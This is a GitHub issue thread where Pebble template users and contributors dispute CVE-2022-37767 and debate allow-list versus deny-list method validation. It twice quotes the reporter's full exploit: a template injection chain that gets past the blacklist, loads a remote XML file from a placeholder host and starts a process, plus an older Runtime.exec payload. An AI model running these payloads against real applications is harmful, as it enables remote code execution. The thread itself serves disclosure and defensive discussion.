| [@slandelle](https://github.com/slandelle)  * Some people design applications where end-users can edit the Pebble templates directly in production, eg served from the database or the filesystem.  Allowing the user to edit templates without proper input validation is a security issue by itself as one might intentionally (or unintentionally) save a code exposing a Cross-Site-Scripting (XSS) vulnerability on top of the RCE one.  If we take this approach, we should consider the entire JavaScript as super insecure as it exposes the ‘eval’ function and one might write an application that reads data from the untrusted database/filesystem and executes the malicious code.  You might still want to change the behavior of Pebble’s default ‘MethodAccessValidatior’ to allow methods on the submitted view model (template variables) only. This would include getters, collection methods but would disallow calling any bean’s or system methods. In other words developers would rather have to push variables to the templates rather than pulling them from the template level by executing bean/system methods. You could still leave the ‘BlacklistMethodAccessValidator’ in the project for these who need it for backward compatibility reasons but it would require manual configuration either from code or the properties file. This should solve the mysterious CVE but could introduce a backward incompatible change for these relying on the system calls executed from the templates.  In case of the applications that I take care of, I consider calling bean methods from the template code a bad practice when you have the neat view model approach. Calling Java methods from the template in both potentially dangerous, hard to test and prone to refactoring related errors. I can still imagine that one might need to call individual bean’s methods from the user managed templates but I consider it as a corner case. To me it sounds like programming-trough-the-template approach.  The CVE is not relevant to my application but it makes the Pebble library appear as an extreme risk in the security scan report.  If you agree to change the behavior of the default ‘MethodAccessValidator’ - I am willing to help. |

| This would include getters, collection methods but would disallow calling any bean’s or system methods.  Technically, how do you implement those categories?  A getter is only a convention. Is `getClass` or `getClassLoader` a getter? In Java, collections are not isolated, they sit in the `java.util` package, along with you also have things like `TimerThread`. You probably want to be able to do a substring on a String, or get its length. But in Java, all base types live in the `java.lang` package, where you also have things like `Thread`, `System` and `Runtime`.  It's actually very complicated.  In other words developers would rather have to push variables to the templates rather than pulling them from the template level by executing bean/system methods.  What about POJO trees or collections traversal: `foo.bar.baz`?  I consider calling bean methods from the template code a bad practice when you have the neat view model approach  What about static helpers, eg for formatting? This is a view concern so using those here is legit.  The CVE is not relevant to my application but it makes the Pebble library appear as an extreme risk in the security scan report.  In the end, a template is just a piece of the program. It doesn't look to me that Pebble is any less secure than Java itself. IMO, this CVE is not relevant. And neither is the previous one that resulted in introducing MethodAccessValidator.  If you agree to change the behavior of the default ‘MethodAccessValidator’ - I am willing to help.  Ha ha, there's a misunderstanding here :) I'm not a committer here, just a mere occasional contributor. I raised my voice in this ticket because we use Pebble in Gatling.  I'm willing to lend a hand but the owner here is [@ebussieres](https://github.com/ebussieres) and I absolutely don't have the bandwidth to become a core committer here. |

| FYI, I've requested the invalidation of the CVE. Here's the message I posted on the [MITRE form](https://cveform.mitre.org/):  ``` Hi,  I'm a contributor on the PebbleTemplate open-source project. Some time ago, a CVE against this library was created. The reporter is unknown and the PebbleTemplate authors and community were not consulted in the process, in particular to check that the CVE was valid.  The report is based on an issue on an external GitHub bug tracker (https://github.com/Y4tacker/Web-Security/issues/3) which is now private, resulting in the link in the CVE description now being broken. I've managed to retrieve its content and copy it here: https://github.com/PebbleTemplates/pebble/issues/625#issuecomment-1282138635.  We've discussed this CVE with other users of this library and we strongly disagree with it.  The Pebble templating engine is to be embedded in Java applications and developers can code in the templates what they could code directly in the Java part of their application, like with Java Server Pages (JSP). In this sense, Pebble is not less secure than Java itself. If some developers decide to implement a feature to let their application consume templates provided by the end users, it's their responsibility to properly sanitize user input, just like one would protect against SQL injection. It's not the responsibility of the library.  As a result, I humbly request that you invalidate this CVE.  Best regards,  Stéphane Landelle  ``` |

| Not a contributor, not even a major user, but I came across this in my normal Gradle buildscript upgrade where I noticed that, yet again, my HTTP framework was including something with a vulnerability.  I disagree with the CVE and CVSS. That being said, there is some inconsistency which could lead to a "security issue."  Templates, pebble or not, are arbitrary code. They should be highly sanitized. Any failure to do so is the applications fault. In fact, that is my major gripe with the CVSS: this is **NOT** a remote vulnerability.  That being said, this does seem to be a bypass to existing mechanism of security: the blacklist. I don't use Spring Boot so I may be wrong in this front. Additionally, I do recognize that ensuring the blacklist cannot be bypassed is practically, if not literally, impossible, but the library's dependencies should not expose this issue by default.  I would suggest allowing a whitelist to be selected (if possible in a backwards compatible manner) or at the very minimum sanitizing the library's dependencies for bypass vulnerabilities. This ensures that the blacklist feature works as the user may expect (minus the obvious oversights users *should* expect from a default blacklist.)  In the meantime, I am yet again going to ignore the big yellow highlighting and tell Snyk it needs to calm down. |

| Hi all. One of our dev/test pipelines is blocked by this CVE. Our specific use case is running Gradle Gatling for load tests. This has Pebble as a dependency. From the helpful comments here I am understanding this disputed CVE as  "If Pebble is configured to read a template (or classpath location?) from a location that is under control of a malicious actor, the malicious actor could introduce malicious code which would be executed"? Is that fair?  In which case isn't it the same as using an insecure writeable public repo, or hosting your templates on a public writeable S3 bucket? Am I missing something? Other than this kind of egregious failure of source code security, is there any way someone could use this CVE for an attack?  Also - is there any progress on the proposed mitigations (Whitelist mode)? |

| Note: Gatling creator here.  Is that fair?  yes  In which case isn't it the same as using an insecure writeable public repo, or hosting your templates on a public writeable S3 bucket?  It is exactly this.  is there any way someone could use this CVE for an attack?  None I can think of.  Also - is there any progress on the proposed mitigations (Whitelist mode)?  I don’t think so. And it's probably a huge undertaking (similar to the official SecurityManager that has been deprecated for removal).  I tried to reach out to the organization maintaining the CVE database to try to get this CVE reconsidered but they never bothered replying. IMO, you should tune your vulnerability scanning tool to make this CVE a false positive. |

| Pebble 3.1.5 Bypass Pebble Templates 3.1.5 allows attackers to bypass a protection mechanism and implement arbitrary code execution with springboot.  First, simply set up an environment with the official documentation：<https://pebbletemplates.io/>  Pom.xml  ``` <?xml version="1.0" encoding="UTF-8"?> <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">     <modelVersion>4.0.0</modelVersion>     <parent>         <groupId>org.springframework.boot</groupId>         <artifactId>spring-boot-starter-parent</artifactId>         <version>2.7.2</version>         <relativePath/> <!-- lookup parent from repository -->     </parent>     <groupId>com.example</groupId>     <artifactId>hackingpebble</artifactId>     <version>0.0.1-SNAPSHOT</version>     <name>hackingpebble</name>     <description>hackingpebble</description>     <properties>         <java.version>1.8</java.version>     </properties>     <dependencies>         <dependency>             <groupId>org.springframework.boot</groupId>             <artifactId>spring-boot-starter-web</artifactId>         </dependency>         <dependency>             <groupId>io.pebbletemplates</groupId>             <artifactId>pebble-spring-boot-starter</artifactId>             <version>3.1.5</version>         </dependency>          <dependency>             <groupId>org.springframework.boot</groupId>             <artifactId>spring-boot-starter-test</artifactId>             <scope>test</scope>         </dependency>     </dependencies>      <build>         <plugins>             <plugin>                 <groupId>org.springframework.boot</groupId>                 <artifactId>spring-boot-maven-plugin</artifactId>             </plugin>         </plugins>     </build>  </project>  ```  com.example.hackingpebble.HackingpebbleApplication.java  ``` package com.example.hackingpebble;  import com.mitchellbosecke.pebble.PebbleEngine; import com.mitchellbosecke.pebble.loader.Loader; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.context.annotation.Bean;  @SpringBootApplication public class HackingpebbleApplication {      public static void main(String[] args) {         SpringApplication.run(HackingpebbleApplication.class, args);     }  } ```  com.example.hackingpebble.controller.Test.java  ``` package com.example.hackingpebble.controller;  import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam;  @Controller public class Test {      @RequestMapping({"/"})     public String getTemplate(@RequestParam String template) {         return template;      }  } ```  application.properties  ``` pebble.prefix = templates pebble.suffix = .pebble ```  And file structure as follows: [2022-08-03 20 57 15](https://user-images.githubusercontent.com/56486273/182613443-8dc02374-35f8-428a-94e7-33ecf5b19087.png)  When we control the parameter template we can render back the specified template file.  In previous versions, in order to mitigate command execution caused by malicious content in the template，pebble introduces a new security mechanism, which is implemented through the class BlacklistMethodAccessValidator.  In this class you can see a lot of restrictions, on the one hand, restricting the class to be an instance of certain classes, and on the other hand, restricting the execution of some methods  ``` public class BlacklistMethodAccessValidator implements MethodAccessValidator {     private static final String[] FORBIDDEN_METHODS = new String[]{"getClass", "wait", "notify", "notifyAll"};      public BlacklistMethodAccessValidator() {     }      public boolean isMethodAccessAllowed(Object object, Method method) {         boolean methodForbidden = object instanceof Class || object instanceof Runtime || object instanceof Thread || object instanceof ThreadGroup || object instanceof System || object instanceof AccessibleObject || this.isUnsafeMethod(method);         return !methodForbidden;     }      private boolean isUnsafeMethod(Method member) {         return this.isAnyOfMethods(member, FORBIDDEN_METHODS);     }      private boolean isAnyOfMethods(Method member, String... methods) {         String[] var3 = methods;         int var4 = methods.length;          for(int var5 = 0; var5 < var4; ++var5) {             String method = var3[var5];             if (this.isMethodWithName(member, method)) {                 return true;             }         }          return false;     }      private boolean isMethodWithName(Method member, String method) {         return member.getName().equals(method);     } } ```  Look at the old version of exploit, loading any class by Class.forName，now，no class  ``` {% set cmd = 'id' %} {% set bytes = (1).TYPE      .forName('java.lang.Runtime')      .methods[6]      .invoke(null,null)      .exec(cmd) %} ```  What can we do? So far we know that many instances of Spring applications are implicitly registered as beans, so can we find an object from a bean that holds a classloader object, and by getting it we can load any object by executing loadClass  By debugging we can easily export these beans objects  [1](https://user-images.githubusercontent.com/56486273/182612181-b21c98e1-b586-4c02-a0b6-d8c863a76a22.png)  So we have to find some eligible beans among these classes  ``` org.springframework.context.annotation.internalConfigurationAnnotationProcessor org.springframework.context.annotation.internalAutowiredAnnotationProcessor org.springframework.context.annotation.internalCommonAnnotationProcessor

fit the criteria and it helped us get the classloader object  [2](https://user-images.githubusercontent.com/56486273/182612219-ec75b2f6-77b1-43cd-ab16-4f459aeba184.png)  It is not enough to execute loadclass, we also need to instantiate the class. And It's also very simple, there is jackson among spring's dependencies, through jackson deserialization we can easily instantiate a class.  Fortunately there is this jacksonObjectMapper object in the beans.Now we can instantiate arbitrary classes, and by being able to instantiate arbitrary classes we have bypassed the filtering restrictions  In the spring scenario we can easily think of a configuration class org.springframework.context.support.ClassPathXmlApplicationContext, which allows us to load a remote xml configuration file, through which we can easily implement the command execution.  But...  At this point you will find that any class jackson that inherits from AbstractPointcutAdvisor and AbstractApplicationContext will not be allowed to instantiate  ```     public void validateSubType(DeserializationContext ctxt, JavaType type, BeanDescription beanDesc) throws JsonMappingException {         Class<?> raw = type.getRawClass();         String full = raw.getName();         if (!this._cfgIllegalClassNames.contains(full)) {             if (raw.isInterface()) {                 return;             }              if (full.startsWith("org.springframework.")) {                 Class cls = raw;                  while(true) {                     if (cls == null || cls == Object.class) {                         return;                     }                      String name = cls.getSimpleName();                     if ("AbstractPointcutAdvisor".equals(name) || "AbstractApplicationContext".equals(name)) {                         break;                     }                      cls = cls.getSuperclass();                 }             } else if (!full.startsWith("com.mchange.v2.c3p0.") || !full.endsWith("DataSource")) {                 return;             }         }          ctxt.reportBadTypeDefinition(beanDesc, "Illegal type (%s) to deserialize: prevented for security reasons", new Object[]{full});     } ```  What to do at this time? We found a class called java.beans.Beans in jre.  The instantiate method of this class can help us instantiate arbitrary methods.  ``` public static Object instantiate(ClassLoader cls, String beanName) throws IOException, ClassNotFoundException {   return Beans.instantiate(cls, beanName, null, null); } ```  Here the classloader parameter is allowed to be set to empty, if it is empty later will be through the ClassLoader.getSystemClassLoader (); get, of course, in fact, we also get a classloader at the top which is not the point，It will eventually return an instantiated object based on the beanName passed in.  ``` if (result == null) {   // No serialized object, try just instantiating the class   Class<?> cl;    try {     cl = ClassFinder.findClass(beanName, cls);   } catch (ClassNotFoundException ex) {     // There is no appropriate class.  If we earlier tried to     // deserialize an object and got an IO exception, throw that,     // otherwise rethrow the ClassNotFoundException.     if (serex != null) {       throw serex;     }     throw ex;   }    if (!Modifier.isPublic(cl.getModifiers())) {     throw new ClassNotFoundException("" + cl + " : no public access");   }    /*              * Try to instantiate the class.              */    try {     result = cl.newInstance();   } catch (Exception ex) {     // We have to remap the exception to one in our signature.     // But we pass extra information in the detail message.     throw new ClassNotFoundException("" + cl + " : " + ex, ex);   } } ```  So we get the ClassPathXmlApplicationContext class that was forbidden to be instantiated by indirect means.  So by stringing these points together we can easily get the following payload  ``` {% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %} {% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %} {{ yyy.setConfigLocation("http://xxx.xxx.xxx/1.xml") }} {{ yyy.refresh() }} ```  1.xml  ``` <?xml version="1.0" encoding="UTF-8" ?>     <beans xmlns="http://www.springframework.org/schema/beans"        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xsi:schemaLocation="      http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">             <constructor-arg >             <list>                 <value>open</value>                 <value>-a</value>                 <value>calculator</value>             </list>             </constructor-arg>         </bean>     </beans> ```  with http server in your vps  ``` python3 -m http.server 80  ```  Successfully triggered command execution by template file called rce.pebble [3](https://user-images.githubusercontent.com/56486273/182613215-94d98d05-3f5c-4dee-87e4-445dd60c2d2c.png) |

| IMHO, using deny lists is an error and pebble should switch to using allow lists instead: the end-user should be responsible of deciding which classes are safe and which are not.  [@ebussieres](https://github.com/ebussieres) WDYT? |

| Disclaimer: I'm just an occasional contributor here  [@chaitu0292](https://github.com/chaitu0292) No, this CVE is not addressed. IMHO, the blacklist approach that was picked cannot possibly cover all possible security leaks and only a whitelist approach where the user explicitly lists what's needed in his templates can work. But maybe I'm missing something.  [@rumfuddle](https://github.com/rumfuddle) Then, corporate users who depend on this library should not stay idle and wait for some open-source volunteers to tackle this issue on their free time. They should contribute, either in manpower or financially. |

| [@rumfuddle](https://github.com/rumfuddle) No it's not just an upgrade of a dependency. You need to define a MethodAccessValidator [implementation](https://github.com/PebbleTemplates/pebble/blob/master/pebble/src/main/java/com/mitchellbosecke/pebble/attributes/methodaccess/MethodAccessValidator.java)  Then If you use pebble-spring:   * Define a bean which implements `MethodAccessValidator`  ```     @Bean     public MethodAccessValidator methodAccessValidator() {       return new BlacklistMethodAccessValidator(); //Provide your custom implementation     }  ```  If not   * override the default MethodAccessValidator in PebbleEngine  ```   new PebbleEngine.Builder()             .methodAccessValidator(new BlacklistMethodAccessValidator()) //Provide your custom implementation             .build();  ```  The complexity resides in the implementation. If we provide a WhitelistMethodAccessValidator, we'll need to whitelist a lot of things (jdk, spring etc.). See this [comment](https://github.com/PebbleTemplates/pebble/pull/494#issuecomment-629691422)  I'm all ears open for suggestions |

| we'll need to whitelist a lot of things (jdk, spring etc.)  jdk  Indeed, core classes and Java collections are often used in pebble templates.  spring  This I don't get, sorry. Why should it be possible for a user to have access **by default** to Spring core classes in his pebble templates? [@ebussieres](https://github.com/ebussieres) Could you please elaborate?  My2cents:  It's possible to harden a default configuration for a known subset of classes, typically the JDK. It's not possible for frameworks such as Spring.  Pebble can provide a sensible default configuration that grants access to all `java.lang` and `java.util` packages, with a few exceptions like `Thread` and `getClass` like it's currently implemented that would have higher priority.  For all other classes and methods, the user would have to explicitly list what he wants to enable, typically his POJOs and utils.  [@ebussieres](https://github.com/ebussieres) WDYT? |

| My apologies for my earlier comment. I only now found the time to look at the issue (I got it confused with a Apache commons vulnerability), and I can see the complexity. For my use case, whitelisting whereby the default whitelist is even empty and the user is required to add "everything" would unblock us but I also appreciate the fact that you need to consider backwards compatibility with the current implementation. And the opposite, blacklisting would not make the CVE go away I guess. |

| And the opposite, blacklisting would not make the CVE go away I guess.  Exactly.  Then, please remember that CVE severity is only determined based on the potential impact if someone was able to exploit it. It doesn't provide any context about the conditions for being able to exploit it. In this case, the only way to exploit is that the templates are generated from an untrusted source, eg having a system that publishes templates in a directory and have the Spring application load them from the filesystem. If your templates are shipped with your application code by your developers, your developers can't do more harm this way than what they can already do with malicious code in their Java code. |

| In our use case, templates are 'data', provided by endusers but at least endusers that have to authenticate and that we trust. So I'm not that worried about exploits. Bigger problem is Nexus. The CVE is level critical, so we cannot perform any build&deploys until this is fixed. |

| Is there any chance this gets resolved any time soon? I am also willing to contribute. As [@rumfuddle](https://github.com/rumfuddle) mentioned, it breaks any corporate build.  To me **this vulnerability would only exhibit itself in scenarios in which the application accepts the input and then directly evaluates it as the template** which is a horribly bad practice.  In the most common case when the templates are managed by the development team the chance of doing any harm is really low. Why would anyone want to execute code from the hand-crafted developer managed template if one could do the same system call directly from the Java code itself. |

| [@slandelle](https://github.com/slandelle) [@ebussieres](https://github.com/ebussieres) I am willing to contribute on behalf of myself or the organization that I am part of if I know that the PR/solution will be accepted into the master.  I suggest to create a `DefaultMethodAccessValidator` or `StrictMethodAccessValidator` that will be active as the default MethodAccessValidator, allowing the template developers to read the properties of the of the template variables `ONLY`.  The user will still be able to configure a backward compatible `BlacklistMethodAccessValidator` either programatically or by setting appropriate Spring Boot starter property.  This should work flawlessly for users who use the view model approach, users who need to execute custom code from the templates will be able to set back the "old" `BlacklistMethodAccessValidator`. This should solve the CVE.  Please let me know what you think. |

| COPIED FROM THE ORIGINAL REPO THAT WON'T STAY PUBLIC  ================================================  Pebble Templates 3.1.5 allows attackers to bypass a protection mechanism and implement arbitrary code execution with springboot.  First, simply set up an environment with the official documentation：<https://pebbletemplates.io/>  pom.xml  ``` <?xml version="1.0" encoding="UTF-8"?> <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">     <modelVersion>4.0.0</modelVersion>     <parent>         <groupId>org.springframework.boot</groupId>         <artifactId>spring-boot-starter-parent</artifactId>         <version>2.7.2</version>         <relativePath/> <!-- lookup parent from repository -->     </parent>     <groupId>com.example</groupId>     <artifactId>hackingpebble</artifactId>     <version>0.0.1-SNAPSHOT</version>     <name>hackingpebble</name>     <description>hackingpebble</description>     <properties>         <java.version>1.8</java.version>     </properties>     <dependencies>         <dependency>             <groupId>org.springframework.boot</groupId>             <artifactId>spring-boot-starter-web</artifactId>         </dependency>         <dependency>             <groupId>io.pebbletemplates</groupId>             <artifactId>pebble-spring-boot-starter</artifactId>             <version>3.1.5</version>         </dependency>          <dependency>             <groupId>org.springframework.boot</groupId>             <artifactId>spring-boot-starter-test</artifactId>             <scope>test</scope>         </dependency>     </dependencies>      <build>         <plugins>             <plugin>                 <groupId>org.springframework.boot</groupId>                 <artifactId>spring-boot-maven-plugin</artifactId>             </plugin>         </plugins>     </build>  </project> ```  com.example.hackingpebble.HackingpebbleApplication.java  ``` package com.example.hackingpebble;  import com.mitchellbosecke.pebble.PebbleEngine; import com.mitchellbosecke.pebble.loader.Loader; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.context.annotation.Bean;  @SpringBootApplication public class HackingpebbleApplication {      public static void main(String[] args) {         SpringApplication.run(HackingpebbleApplication.class, args);     }  } ```  com.example.hackingpebble.controller.Test.java  ``` package com.example.hackingpebble.controller;  import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam;  @Controller public class Test {      @RequestMapping({"/"})     public String getTemplate(@RequestParam String template) {         return template;      }  } ```  application.properties  ``` pebble.prefix = templates pebble.suffix = .pebble  ```  And file structure as follows:  [182613443-8dc02374-35f8-428a-94e7-33ecf5b19087](https://user-images.githubusercontent.com/849197/196399052-bc6c4a4e-6b17-4545-b252-cf829f1317e3.png)  When we control the parameter template we can render back the specified template file.  In previous versions, in order to mitigate command execution caused by malicious content in the template，pebble introduces a new security mechanism, which is implemented through the class BlacklistMethodAccessValidator.  In this class you can see a lot of restrictions, on the one hand, restricting the class to be an instance of certain classes, and on the other hand, restricting the execution of some methods  ``` public class BlacklistMethodAccessValidator implements MethodAccessValidator {     private static final String[] FORBIDDEN_METHODS = new String[]{"getClass", "wait", "notify", "notifyAll"};      public BlacklistMethodAccessValidator() {     }      public boolean isMethodAccessAllowed(Object object, Method method) {         boolean methodForbidden = object instanceof Class || object instanceof Runtime || object instanceof Thread || object instanceof ThreadGroup || object instanceof System || object instanceof AccessibleObject || this.isUnsafeMethod(method);         return !methodForbidden;     }      private boolean isUnsafeMethod(Method member) {         return this.isAnyOfMethods(member, FORBIDDEN_METHODS);     }      private boolean isAnyOfMethods(Method member, String... methods) {         String[] var3 = methods;         int var4 = methods.length;          for(int var5 = 0; var5 < var4; ++var5) {             String method = var3[var5];             if (this.isMethodWithName(member, method)) {                 return true;             }         }          return false;     }      private boolean isMethodWithName(Method member, String method) {         return member.getName().equals(method);     } } ```  Look at the old version of exploit, loading any class by Class.forName，now，no class  ``` {% set cmd = 'id' %} {% set bytes = (1).TYPE      .forName('java.lang.Runtime')      .methods[6]      .invoke(null,null)      .exec(cmd) %}  ```  What can we do? So far we know that many instances of Spring applications are implicitly registered as beans, so can we find an object from a bean that holds a classloader object, and by getting it we can load any object by executing loadClass  By debugging we can easily export these beans objects  [182612181-b21c98e1-b586-4c02-a0b6-d8c863a76a22](https://user-images.githubusercontent.com/849197/196399256-87e78dd1-276a-40ad-abab-63ada5a180d6.png)  So we have to find some eligible beans among these classes  ``` org.springframework.context.annotation.internalConfigurationAnnotationProcessor org.springframework.context.annotation.internalAutowiredAnnotationProcessor

fit the criteria and it helped us get the classloader object  [182612219-ec75b2f6-77b1-43cd-ab16-4f459aeba184](https://user-images.githubusercontent.com/849197/196399451-420e334a-66f6-4e1b-94f4-e0559e3d6c3e.png)  It is not enough to execute loadclass, we also need to instantiate the class. And It's also very simple, there is jackson among spring's dependencies, through jackson deserialization we can easily instantiate a class.  Fortunately there is this jacksonObjectMapper object in the beans.Now we can instantiate arbitrary classes, and by being able to instantiate arbitrary classes we have bypassed the filtering restrictions  In the spring scenario we can easily think of a configuration class org.springframework.context.support.ClassPathXmlApplicationContext, which allows us to load a remote xml configuration file, through which we can easily implement the command execution.  But...  At this point you will find that any class jackson that inherits from AbstractPointcutAdvisor and AbstractApplicationContext will not be allowed to instantiate  ```     public void validateSubType(DeserializationContext ctxt, JavaType type, BeanDescription beanDesc) throws JsonMappingException {         Class<?> raw = type.getRawClass();         String full = raw.getName();         if (!this._cfgIllegalClassNames.contains(full)) {             if (raw.isInterface()) {                 return;             }              if (full.startsWith("org.springframework.")) {                 Class cls = raw;                  while(true) {                     if (cls == null || cls == Object.class) {                         return;                     }                      String name = cls.getSimpleName();                     if ("AbstractPointcutAdvisor".equals(name) || "AbstractApplicationContext".equals(name)) {                         break;                     }                      cls = cls.getSuperclass();                 }             } else if (!full.startsWith("com.mchange.v2.c3p0.") || !full.endsWith("DataSource")) {                 return;             }         }          ctxt.reportBadTypeDefinition(beanDesc, "Illegal type (%s) to deserialize: prevented for security reasons", new Object[]{full});     } ```  What to do at this time? We found a class called java.beans.Beans in jre.  The instantiate method of this class can help us instantiate arbitrary methods.  ``` public static Object instantiate(ClassLoader cls, String beanName) throws IOException, ClassNotFoundException {   return Beans.instantiate(cls, beanName, null, null); } ```  Here the classloader parameter is allowed to be set to empty, if it is empty later will be through the ClassLoader.getSystemClassLoader (); get, of course, in fact, we also get a classloader at the top which is not the point，It will eventually return an instantiated object based on the beanName passed in.  ``` if (result == null) {   // No serialized object, try just instantiating the class   Class<?> cl;    try {     cl = ClassFinder.findClass(beanName, cls);   } catch (ClassNotFoundException ex) {     // There is no appropriate class.  If we earlier tried to     // deserialize an object and got an IO exception, throw that,     // otherwise rethrow the ClassNotFoundException.     if (serex != null) {       throw serex;     }     throw ex;   }    if (!Modifier.isPublic(cl.getModifiers())) {     throw new ClassNotFoundException("" + cl + " : no public access");   }    /*              * Try to instantiate the class.              */    try {     result = cl.newInstance();   } catch (Exception ex) {     // We have to remap the exception to one in our signature.     // But we pass extra information in the detail message.     throw new ClassNotFoundException("" + cl + " : " + ex, ex);   } } ```  So we get the ClassPathXmlApplicationContext class that was forbidden to be instantiated by indirect means.  So by stringing these points together we can easily get the following payload  ``` {% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %} {% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %} {{ yyy.setConfigLocation("http://xxx.xxx.xxx/1.xml") }} {{ yyy.refresh() }}  ```  1.xml  ``` <?xml version="1.0" encoding="UTF-8" ?>     <beans xmlns="http://www.springframework.org/schema/beans"        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xsi:schemaLocation="      http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">             <constructor-arg >             <list>                 <value>open</value>                 <value>-a</value>                 <value>calculator</value>             </list>             </constructor-arg>         </bean>     </beans> ```  with http server in your vps  ``` python3 -m http.server 80  ```  Successfully triggered command execution by template file called rce.pebble  [182613215-94d98d05-3f5c-4dee-87e4-445dd60c2d2c](https://user-images.githubusercontent.com/849197/196399964-0116ba0f-7e4e-4abb-bf75-28ea2ed13491.png) |

| After reviewing the report [Y4tacker/Web-Security#3](https://github.com/Y4tacker/Web-Security/issues/3) I **STRONGLY** disagree with calling this a Pebble vulnerability. TLTR:  * there must be a badly designed controller allowing the user to load arbitrary template from the classpath * the classpath template must intentionally be designed contain malicious code * **Pebble properly handles and escapes any rendered input variable**  The long story:1. Bad controller design The first problem is in the design of the Spring MVC controller - there is no input validation and the `@RequestParam String template` is being directly used as a template name.  This weakness can be exploited to load and render any classpath resource as a template and it would be a real problem no matter what templating engine is being used. In case of Pebble the list of resources that are eligible to be be loaded is being limited by `pebble.prefix` and `pebble.suffix` files.  On top of being fairy insecure, this approach is likely to cause tons HTTP 500 errors for situations like:   * the mismatched template names (example `you-cant-find-me-on-classpath`) * when trying to load templates that expect certain variables (example: `partials/top`)  ``` package com.example.hackingpebble.controller;  import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam;  @Controller public class Test {      @RequestMapping({"/"})     public String getTemplate(@RequestParam String template) {         // Can be used arbitrary file from the classpath LOL         return template;     }  } ``` 2. Malicous code in the template The second problem is in how the reporter designed `resources/template/rce.pebble` template:  ``` {% set cmd = 'id' %} {% set bytes = (1).TYPE      .forName('java.lang.Runtime')      .methods[6]      .invoke(null,null)      .exec(cmd) %}  ```  This template code is not coming from the user input but is **already present on the classpath**.  Why would a developer try to write a malicious code and hide it in a template if one could simply write a malicious code directly in the Java source? 4. MethodAccessValidator `BlacklistMethodAccessValidator` might not even be there, it is not used in the input validation. For systems that control the template contents (or store them locally on the classpath), as far as I understand, `MethodAccessValidator` is to prevent developers from hurting themself (locking the threads or consuming system resources). 3. Conclusion Calling this a CVE is like saying that knives are dangerous because they can be misused. [CVE-2022-37767](https://github.com/advisories/GHSA-wxx5-w9jc-48wx "CVE-2022-37767") is unlikely to exhibit itself in any application that controls own template contents.  Please consider my previous comment [#625 (comment)](https://github.com/PebbleTemplates/pebble/issues/625#issuecomment-1281187930) as a potential improvement (but not as a *security fix*). |

| [@piotrpolak](https://github.com/piotrpolak) From my understanding:   * Some people design applications where end-users can edit the Pebble templates directly in production, eg served from the database or the filesystem. * CVE risk levels are only based on the possible impact if someone manages to exploit it, not based on the feasibility of exploiting it. See log4j and he LDAP stuff as an example. Here, the impact would be remote code execution, hence the highest possible severity.   I agree that sanitizing the end-user input is the application's responsibility. I also agree that with this kind of reasoning, having a door in your house is a critical vulnerability because you could get robbed if you were to leave it wide open...  But now, it seems that nowadays infosec is all about configuring some dependency scanning SaaS product that's going to report every library matching a CVE in the NVD, whatever the usage context. For example, they force me to upgrade moment.js in a static local files generator because of an issue when used with node.js.  Now, I have no idea how this ended up in the NVD, in particular as AFAIK no one reached out the Pebble community to validate it, and so how to revisit the registired CVE. |

| [@slandelle](https://github.com/slandelle)  * Some people design applications where end-users can edit the Pebble templates directly in production, eg served from the database or the filesystem.  Allowing the user to edit templates without proper input validation is a security issue by itself as one might intentionally (or unintentionally) save a code exposing a Cross-Site-Scripting (XSS) vulnerability on top of the RCE one.  If we take this approach, we should consider the entire JavaScript as super insecure as it exposes the ‘eval’ function and one might write an application that reads data from the untrusted database/filesystem and executes the malicious code.  You might still want to change the behavior of Pebble’s default ‘MethodAccessValidatior’ to allow methods on the submitted view model (template variables) only. This would include getters, collection methods but would disallow calling any bean’s or system methods. In other words developers would rather have to push variables to the templates rather than pulling them from the template level by executing bean/system methods. You could still leave the ‘BlacklistMethodAccessValidator’ in the project for these who need it for backward compatibility reasons but it would require manual configuration either from code or the properties file. This should solve the mysterious CVE but could introduce a backward incompatible change for these relying on the system calls executed from the templates.  In case of the applications that I take care of, I consider calling bean methods from the template code a bad practice when you have the neat view model approach. Calling Java methods from the template in both potentially dangerous, hard to test and prone to refactoring related errors. I can still imagine that one might need to call individual bean’s methods from the user managed templates but I consider it as a corner case. To me it sounds like programming-trough-the-template approach.  The CVE is not relevant to my application but it makes the Pebble library appear as an extreme risk in the security scan report.  If you agree to change the behavior of the default ‘MethodAccessValidator’ - I am willing to help. |

